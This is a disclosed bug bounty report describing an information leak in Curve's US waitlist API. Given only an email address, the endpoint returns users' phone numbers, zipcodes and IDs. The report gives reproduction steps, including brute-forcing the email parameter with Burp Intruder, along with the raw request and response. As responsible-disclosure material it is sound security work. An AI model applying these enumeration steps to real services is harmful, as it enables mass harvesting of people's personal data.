# Sensitive Info Leak - An Attacker Can Retrieve All the Users Mobile Numbers at https://website-api.production.curve.app/api/waitlist/us

## Report Details
- **Report ID**: 902733
- **URL**: https://hackerone.com/reports/902733
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-06-19T10:20:26.553Z
- **Disclosed**: 2020-10-23T15:38:56.276Z

## Reporter
- **Username**: praseudo7
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: curve

## Vulnerability Information
Hi,

When am going through all the JS files in curve.com I found a link called "/usa" is used to create Curve USA Waitlists by entering your name, email address, mobile number and address details. 

{F874173}

Then there is a functionality called "Track my Position" by using which joined users can view their position in the waiting lists. 

{F874174}

Well, in UI the application only shows the position number but not any other sensitive details. 

{F874175}

But by using the below reported endpoint an attacker can retrieve all the joined users mobile numbers and the other details by just entering the victims email address.

Steps to Reproduce:
=================
1] Navigate to https://curve.com/usa and click on "Track my position"
2] Enter any email address and click on "Submit"
3] Make sure to intercept the request using Burp intercept
4] You'll be presented with the below vulnerable request

Vulnerable Request:
=================
```
POST /api/waitlist/us HTTP/1.1
Host: website-api.production.curve.app
Connection: close
Content-Length: 30
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: https://www.curve.com
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.curve.com/credit?rc=
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

{"email":"praseudo@gmail.com"}
```

5] Now send the above vulnerable request to Burp intruder and brute force the email parameter
6] You'll now be able to retrieve all the waitlisted users mobile numbers, ID's, address and other sensitive information in the response.

Response:
=========
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 268
Connection: close
access-control-allow-origin: *
x-dns-prefetch-control: off
x-frame-options: SAMEORIGIN
strict-transport-security: max-age=15552000; includeSubDomains
x-download-options: noopen
x-content-type-options: nosniff
x-xss-protection: 1; mode=block
etag: W/"10c-Qj52/PIteKYG+1CbKaOCNpKyiDo"
date: Fri, 19 Jun 2020 09:41:26 GMT
x-envoy-upstream-service-time: 3
x-envoy-peer-metadata: Ch4KDElOU1RBTkNFX0lQUxIOGgwxMC4wLjE1Mi4yMDEK0AEKBkxBQkVMUxLFASrCAQoUCgNhcHASDRoLd2Vic2l0ZS1hcGkKIQoRcG9kLXRlbXBsYXRlLWhhc2gSDBoKN2Q5NzRmNTQ3NQokChlzZWN1cml0eS5pc3Rpby5pby90bHNNb2RlEgcaBWlzdGlvCjAKH3NlcnZpY2UuaXN0aW8uaW8vY2Fub25pY2FsLW5hbWUSDRoLd2Vic2l0ZS1hcGkKLwojc2VydmljZS5pc3Rpby5pby9jYW5vbmljYWwtcmV2aXNpb24SCBoGbGF0ZXN0ChoKB01FU0hfSUQSDxoNY2x1c3Rlci5sb2NhbAomCgROQU1FEh4aHHdlYnNpdGUtYXBpLTdkOTc0ZjU0NzUtZHRuZzgKGQoJTkFNRVNQQUNFEgwaCnByb2R1Y3Rpb24KUgoFT1dORVISSRpHa3ViZXJuZXRlczovL2FwaXMvYXBwcy92MS9uYW1lc3BhY2VzL3Byb2R1Y3Rpb24vZGVwbG95bWVudHMvd2Vic2l0ZS1hcGkKHwoPU0VSVklDRV9BQ0NPVU5UEgwaCnZhdWx0LWF1dGgKHgoNV09SS0xPQURfTkFNRRINGgt3ZWJzaXRlLWFwaQ==
x-envoy-peer-metadata-id: sidecar~10.0.152.201~website-api-7d974f5475-dtng8.production~production.svc.cluster.local
server: envoy
X-Cache: Miss from cloudfront
Via: 1.1 1671dd64160321b1f8979341944a5b14.cloudfront.net (CloudFront)
X-Amz-Cf-Pop: MAA50-C2
X-Amz-Cf-Id: kUgxzRYYQ9rJw0zP7oR4PnDz6Rz4bCc6r30M25JrfmOyzp_xuMEHyA==

{"_id":"5eec6b1a958666b5141063e3","name":"Cxvvc","email":"praseudo@gmail.com","phoneNumber":"7013899887","zipcode":"10001","position":4379,"referralCode":"BCeE8mzI","createdAt":"2020-06-19T07:36:58.460Z","updatedAt":"2020-06-19T07:36:58.460Z","__v":0,"status":"EXIST"}
```

Below is the video POC for better understanding:

{F874205}

## Impact

An attacker can retrieve all the joined users PII data (like mobile numbers, address, ID's, etc) by just entering the mail address at "Track my position" at https://curve.com/usa.

Mitigation:
=========
Make sure to remove sensitive response parameters which discloses users PII data.


Regards,
Praseudo

## Attachments
- Image_2020-06-19_at_2.57.13_PM.png
- Image_2020-06-19_at_2.59.13_PM.png
- Image_2020-06-19_at_3.23.36_PM.png
- Curve_Sens_Info.mov
